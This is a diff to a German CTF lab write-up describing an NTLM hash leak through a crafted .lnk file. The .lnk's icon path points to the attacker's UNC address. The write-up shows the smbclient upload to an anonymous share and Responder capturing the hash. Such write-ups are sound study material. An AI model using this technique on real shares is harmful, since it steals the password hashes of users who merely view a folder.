@@ -15,8 +15,9 @@ techniques: [smb-enum, ntlm-leak, hash-cracking]
 > [!info] Kill Chain
 > [[SMB Enumeration]] (anon Share) → bösartige `.lnk` auf Share → Opfer-Rechtsklick löst [[NTLM Hash Leak]] aus → Hash via [[Responder]] gefangen → [[Hash Cracking]] (john) → Creds → RDP → **Flag**
 
-> [!note] Die Lücke
-> Rechtsklick auf eine präparierte `.lnk` leakt den **NTLMv2-Hash** (alle Windows-Versionen). Microsoft: durch *Mark of the Web* bei Internet-Downloads blockiert → **kein CVE**. Dateien auf **Shares** sind aber trotzdem verwundbar.
+> [!note] Die Lücke – was die Auth auslöst
+> Eine `.lnk` enthält einen **Icon-Pfad**. Zeigt dieser auf einen UNC-Pfad (`\\<attacker-ip>\share`), muss Windows das Icon über SMB von dort laden, sobald der Explorer die Datei **darstellt** (Ordneransicht / Vorschau / Rechtsklick) – kein Klick auf die Datei nötig.
+> Der SMB-Verbindungsaufbau triggert automatisch die **NTLM-Authentifizierung** → der NTLMv2-Hash des angezeigten Users geht an den UNC-Host (= mein Responder). Betrifft alle Windows-Versionen. Microsoft blockt das nur bei Internet-Downloads via *Mark of the Web* → **kein CVE**; Dateien auf internen **Shares** tragen kein MotW → weiter verwundbar. Mechanismus: [[NTLM Hash Leak]].
 
 ---
 
@@ -48,20 +49,20 @@ x86_64-w64-mingw32-gcc -o poc poc.c   # unter Linux kompilieren => poc.exe
 wine poc.exe                          # .exe ausführen => poc.lnk
 ```
 > `mingw32-gcc` kompiliert Windows-Binaries unter Linux, `wine` führt sie aus.
-- eine `.lnk` kann auf eine Netzwerk-Adresse verweisen → verweist sie auf mich, baut das Opfer-System beim bloßen Anzeigen eine SMB-Verbindung auf und übermittelt dabei den NTLM-Hash
+- der entscheidende Teil ist der **Icon-Pfad** der `.lnk` → zeigt er auf `\\<tun0-ip>\share`, lädt Windows das Icon über SMB von meiner Maschine, sobald der Explorer die Datei darstellt → dabei wird der NTLM-Hash übermittelt
 - im `poc.c` die **eigene tun0-IP** eintragen, nicht die der Box (sonst wird der Hash an die falsche Adresse gesendet)
 
 ## 2.2 `.lnk` auf den Share legen
 ```bash
 smbclient //10.129.234.64/share -N -c 'put poc.lnk'
 ```
-- `put` lädt die Datei auf den Share → wird später vom simulierten User geöffnet
-- das bloße Anzeigen im Explorer genügt (Icon-Rendering, kein Klick nötig) → Hash wird übertragen
+- `put` lädt die Datei auf den Share → der simulierte User öffnet dort den Ordner
+- schon das **Darstellen** der Datei im Explorer löst das Icon-Rendering aus (kein Klick/Öffnen der `.lnk` nötig) → SMB-Verbindung zu mir → Hash wird übertragen
 
 ## 2.3 Hash abfangen → [[Responder]]
 ```bash
 responder -I tun0 -P
-# wartet auf SMB-Auth; Opfer-Rechtsklick => NTLMv2-Hash erscheint
+# wartet auf SMB-Auth; sobald der User den Ordner ansieht => NTLMv2-Hash erscheint
 ```
 - Responder emuliert den SMB-Server, nimmt die Authentifizierung entgegen und protokolliert den Hash
 - `-I tun0` = lauscht auf dem VPN-Interface → warten, bis der Hash in der Konsole erscheint
